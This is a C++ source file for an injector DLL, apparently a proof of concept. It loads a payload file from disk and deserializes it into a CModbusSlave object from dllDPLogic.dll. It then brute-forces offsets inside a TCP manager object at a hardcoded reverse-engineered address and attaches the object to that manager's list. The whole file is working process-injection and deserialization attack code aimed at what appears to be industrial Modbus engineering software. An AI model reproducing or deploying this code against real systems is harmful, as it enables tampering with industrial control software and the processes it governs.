#include <afx.h>
#include <afxwin.h>
#include <afxtempl.h>
#include <vector>

#define IDA_BASE 0x00400000
#define TCP_MANAGER_IDA_ADDR 0x0084713C

void ShowError(LPCTSTR msg) {
    ::MessageBox(NULL, msg, _T("Injector Debug"), MB_OK | MB_ICONERROR);
}

extern "C" __declspec(dllexport) void RunPoc()
{
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    CFile file;
    if (!file.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary)) {
        ShowError(_T("Payload not found"));
        return;
    }
    ULONGLONG size = file.GetLength();
    std::vector<BYTE> buffer((size_t)size);
    file.Read(buffer.data(), (UINT)size);
    file.Close();

    CMemFile memFile(buffer.data(), (UINT)size);
    CArchive ar(&memFile, CArchive::load);

    HMODULE hDll = GetModuleHandle(_T("dllDPLogic.dll"));
    if (!hDll) {
        ShowError(_T("dllDPLogic not loaded"));
        return;
    }

    typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
    FARPROC proc = GetProcAddress(hDll, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) {
        ShowError(_T("Factory not found"));
        return;
    }

    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* pClass = getClass();
    CObject* pObj = pClass->CreateObject();

    if (!pObj) {
        ShowError(_T("CreateObject failed"));
        return;
    }

    try {
        pObj->Serialize(ar);
    } catch (CException* e) {
        e->Delete();
        ShowError(_T("Serialize Failed"));
        delete pObj;
        return;
    }

    DWORD_PTR baseAddr = (DWORD_PTR)GetModuleHandle(NULL);
    DWORD_PTR offset = TCP_MANAGER_IDA_ADDR - IDA_BASE;
    void** pManagerPtr = (void**)(baseAddr + offset);

    if (IsBadReadPtr(pManagerPtr, 4)) {
        ShowError(_T("Manager Pointer Address Invalid"));
        return;
    }

    void* pManager = *pManagerPtr;
    if (!pManager || IsBadReadPtr(pManager, 4)) {
        ShowError(_T("Manager Instance is NULL or Invalid (Open a project first)"));
        return;
    }

    int successCount = 0;
    CString log;

    for (int i = 40; i < 200; i += 4) {
        CObList* pList = (CObList*)((char*)pManager + i);
        if (IsBadReadPtr(pList, 8)) {
            continue;
        }

        try {
            pList->AddTail(pObj);
            successCount++;
            log.Format(_T("Attached at Offset %d (0x%X)"), i, i);
            break;
        }
        catch (...) {
        }
    }

    if (successCount > 0) {
        CString msg = _T("🎉 Success! ");
        msg += log;
        msg += _T("\nCheck Tree View!");
        ::MessageBox(NULL, msg, _T("Brute Force"), MB_OK);

        try { *(void**)((char*)pObj + 4) = pManager; } catch (...) {}
        try { *(void**)((char*)pObj + 8) = pManager; } catch (...) {}

        pObj = nullptr;
    } else {
        ::MessageBox(NULL, _T("Failed to attach."), _T("Error"), MB_OK);
        if (pObj) {
            delete pObj;
        }
    }

    ar.Close();
    memFile.Close();
}
